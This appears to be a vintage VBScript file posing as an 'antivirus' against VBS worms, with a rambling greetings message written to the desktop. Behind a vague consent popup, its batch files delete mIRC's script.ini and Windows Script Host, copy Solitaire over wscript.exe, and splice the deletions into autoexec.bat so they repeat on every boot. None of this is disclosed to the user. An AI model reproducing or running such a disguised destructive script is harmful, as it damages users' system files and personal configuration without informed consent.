'************************************************
' File:   antivirus.vbs (VBScript) 
' writer: ThE DraGoN Of AvALoN
' FucK tHE viRii wRiTerS
'************************************************
Option Explicit
Const Titel = "VBS-Protection"
Const Text = "Warning, this program is created to protect your system from any VBS-Virus. It's tested on many different system. We didn't find any bug or error. But this IS no Garantee. If you wanne protect your system, you do it at you own risk! Press on Yes to continue , no to abort!"
Dim antw, oAdr 
Set oAdr = WScript.CreateObject("WScript.Shell")
WScript.Echo "protection against *.VBS and *.js files ----- (c)2000 ThE DraGoN Of AvALoN" & vbCRLF & vbCRLF & vbCRLF, _
	     "info about WSH", vbCRLF, _
             "Aplication: ", WScript.Application & vbCRLF, _
             "Name: ", WScript.Name & vbCRLF, _
             "Version: ", WScript.Version & vbCRLF, _
             "Full-name: ", WScript.FullName & vbCRLF, _
             "Path: ", WScript.Path & vbCRLF, vbCRLF, _
             "Script properties" & vbCRLF, _
             "fullscriptname : ", WScript.ScriptFullName & vbCRLF, _
             "Scriptname : " & WScript.ScriptName & vbCRLF & vbCRLF, _
             "Script-Engine: ", ScriptEngine() & vbCRLF, _
             "Version: " & ScriptEngineMajorVersion() & "." & _
             ScriptEngineMinorVersion() & vbCRLF, _
             "Build: " & ScriptEngineBuildVersion()
antw = oAdr.Popup (Text, 1000, Titel, vbYesNo + vbQuestion)
If antw = vbNO Then 
  oAdr.Popup "Program aborted by user input, there are no modification created on your system!", 200, Titel, vbOkOnly
 WScript.Quit    
Else
 oAdr.Popup "You have choosen to protect your system, press ok to continue", 200, Titel, vbOkOnly
End if
On Error Resume Next

Dim worm, Map, f, b, Fool, a, fc, nf, fso, d, src, src2, src3, Jso, J, JJso, JJ
Const ForReading = 1, ForWriting = 2, ForAppending = 8
Set Fso = CreateObject("scripting.filesystemobject")
Set f = Fso.opentextfile("c:\windows\Desktop\greetings.TXT", 2, True)
f.writeLine "Hi mom if this rules than I'm on TV, looooooooooool NOOOOOOOT"
f.writeLine "hey dady go we fish online this weekend?"
f.writeLine "Hi grandpa worms aren't aliens in your PC!"
f.writeLine ""
f.writeLine "greetings to all gamers:"
f.writeLine "UT C-strike and TBS is that life? not mine "
f.writeLine ""
f.writeLine "greetings to all hackers:"
f.writeLine "Show the world that hackers can ban the virii and worms"
f.writeLine "[HaCKerS Are the best OnLinE-Police]"
f.writeLine ""
f.writeLine "greetings to the governement:"
f.writeLine "Hi there!"
f.writeLine "if you can't stop the virii, we have to do it."
f.writeLine ""
f.writeLine "Greetings to the president:"
f.writeLine "Hi mr President Nice To Meet YOU."
f.writeLine "Greetings to the antivirus software producers:"
f.writeLine "Your stock were great some day's ,sorry that the go down by some freeware."
f.writeLine "BE FASTER !!! BE BETTER !!! BE cheaper !!!"
f.writeLine ""
f.writeLine "greetings to all persons who mail this e-mail to their friends:"
f.writeLine "Thank you all people, I hope you will never get some of this virusses"
f.writeLine ""
f.writeLine "greetings to religions of this world:"
f.writeLine "If you are Moslim, budist christen or you believe in anything/anyone else be nice to each other "
f.writeLine "we have all the same idea, the same problems , the same way of life. "
f.writeLine ""
f.writeLine "greetings to all political leaders:"
f.writeLine "STOP THE WARS !!!"
f.writeLine ""
f.writeLine "greetings to Bill Gates:"
f.writeLine "Why ? why? why ? now shit happens, good-luck old man.    :)"
f.writeLine ""
f.writeLine "greetings to all programmers:"
f.writeLine "don't even think about creating a virus...."
f.writeLine ""
f.writeLine "greetings to my friends:"
f.writeLine "euuhmmm, ...., BEACH PARTYYYYYYYY ?!?!?"
f.writeLine ""
f.writeLine "greetings to GIGABYTE [female Virus writer in Belgium]:"
f.writeLine "hey gig good time choosen to stop writeing."
f.writeLine ""
f.writeLine "greetings to all other virii-writers:"
f.writeLine "get a life, you will never get a girlfriend by writeing a virus,"
f.writeLine "you can't stop school, ... use your aknowledgement to write "
f.writeLine "security programs... you can get money, big cars and girls "
f.writeLine "much better than writeing a silly virus ............;"
f.writeLine ""
f.writeLine ""
f.writeLine ""
f.writeLine ""
f.writeLine "That's ALL FOLKs"
f.writeLine ""
f.writeLine "			tHe DrAgON Of AVALoN"
f.writeLine ""
f.writeLine "EOF"
f.Close
  

Set Jso = CreateObject("scripting.filesystemobject")
Set j = Jso.opentextfile("c:\antiwrm.bat", 2, True)
j.writeLine "@Echo off"
j.writeLine "del c:\Mirc\script.ini"
j.writeLine "del c:\windows\Wscript.exe"
j.writeLine "del wscript.exe"
j.writeLine "cls"
j.Close

Set JJso = CreateObject("scripting.filesystemobject")
Set jj = JJso.opentextfile("c:\dragon.bat", 2, True)
jj.writeLine "@Echo off"
jj.writeLine "copy c:\antiwrm.bat + c:\autoexec.bat c:\2.bat"
jj.writeLine "del c:\autoexec.bat"
jj.writeLine "copy c:\2.bat autoexec.bat"
jj.writeLine "del c:\2.bat"
jj.writeLine "del c:\dragon.bat"
jj.writeLine "del c:\windows\Wscript.exe"
jj.writeLine "copy c:\windows\sol.exe c:\windows\Wscript.exe"
jj.writeLine "cls"
jj.Close
Dim WshObj
Set WshObj = Wscript.CreateObject("WScript.Shell")
WshObj.Run "c:\dragon.bat", _
                  1, true
oAdr.Popup "Finaly you have to reboot your system!!! have a nice day", 200, Titel, vbOkOnly
WScript.Quit


